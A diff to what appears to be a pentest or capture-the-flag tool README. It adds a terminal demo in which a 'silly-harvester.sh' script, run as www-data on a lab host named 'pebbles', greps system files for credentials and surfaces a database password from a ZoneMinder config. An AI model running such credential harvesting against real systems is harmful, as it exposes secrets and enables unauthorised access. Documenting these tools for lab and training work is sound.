@@ -108,3 +108,45 @@ Joanne Lewis
 Processing 28 names...
 Generated 672 unique usernames to usernames.txt
 ```
+
+```shell
+www-data@pebbles:/tmp$ chmod +x silly-harvester.sh 
+www-data@pebbles:/tmp$ ./silly-harvester.sh 
+[+] Starting Database Credential Hunt...
+[+] Scanning:  /var/www /etc /home /opt /root /var/lib /srv /usr/local /var/www/html
+[+]------------------------------------------------
+[+] Found 377 files. Grepping...
+/etc/apache2/sites-available/default-ssl.conf:79:               #        file needs this password: `xxj31ZMTZzkVA'.
+/etc/debconf.conf:69:#BindPasswd: secret
+/etc/debconf.conf:70:#KeyByKey: 0
+/etc/hdparm.conf:87:# security_pass = password
+/etc/mysql/my.cnf:104:# ssl-key=/etc/mysql/server-key.pem
+/etc/mysql/mysql.conf.d/mysqld.cnf:104:# ssl-key=/etc/mysql/server-key.pem
+/etc/nsswitch.conf:7:passwd:         compat
+/etc/overlayroot.conf:135:#     crypt:dev=/dev/vdb,pass=somepassword,mkfs=0
+/etc/overlayroot.conf:138:#      $ MAPNAME="secure"; DEV="/dev/vdg"; PASSWORD="foobar"
+/etc/overlayroot.conf:42:#    are comma delimited key=value pairs.
+/etc/overlayroot.conf:49:#     * pass: default: ""
+/etc/overlayroot.conf:54:#       mapname=mapper,pass=foo,fstype=ext4,mkfs=1
+/etc/overlayroot.conf:67:#      crypt:mapname=mapper,pass=foo,fstype=ext4,mkfs=1,dev=vdb
+/etc/overlayroot.conf:68:#      crypt:mapname=mapper,pass=foo,fstype=ext3,mkfs=1,dev=/dev/disk/by-label/my-jumpdrive,timeout=120
+/etc/ssl/openssl.cnf:113:# input_password = secret
+/etc/ssl/openssl.cnf:114:# output_password = secret
+/etc/ssl/openssl.cnf:157:challengePassword              = A challenge password
+/etc/ssl/openssl.cnf:337:signer_key     = $dir/private/tsakey.pem # The TSA private key (optional)
+/etc/ssl/openssl.cnf:45:database        = $dir/index.txt        # database index file.
+/etc/ssl/openssl.cnf:55:private_key     = $dir/private/cakey.pem# The private key
+/etc/systemd/logind.conf:21:#HandlePowerKey=poweroff
+/etc/systemd/logind.conf:22:#HandleSuspendKey=suspend
+/etc/systemd/logind.conf:23:#HandleHibernateKey=hibernate
+/etc/vmware-tools/guestproxy-ssl.conf:5:encrypt_key             = no
+/etc/zm/zm.conf:38:ZM_DB_HOST=localhost
+/etc/zm/zm.conf:41:ZM_DB_NAME=zm
+/etc/zm/zm.conf:44:ZM_DB_USER=root
+/etc/zm/zm.conf:47:ZM_DB_PASS=ShinyLucentMarker361
+/var/www/auth/index.php:28:                                                     <td><b>Password:</b></td>
+/var/www/auth/index.php:5:      $password = $_POST['password'];
+[+]------------------------------------------------
+[+] Done.
+www-data@pebbles:/tmp$
+```
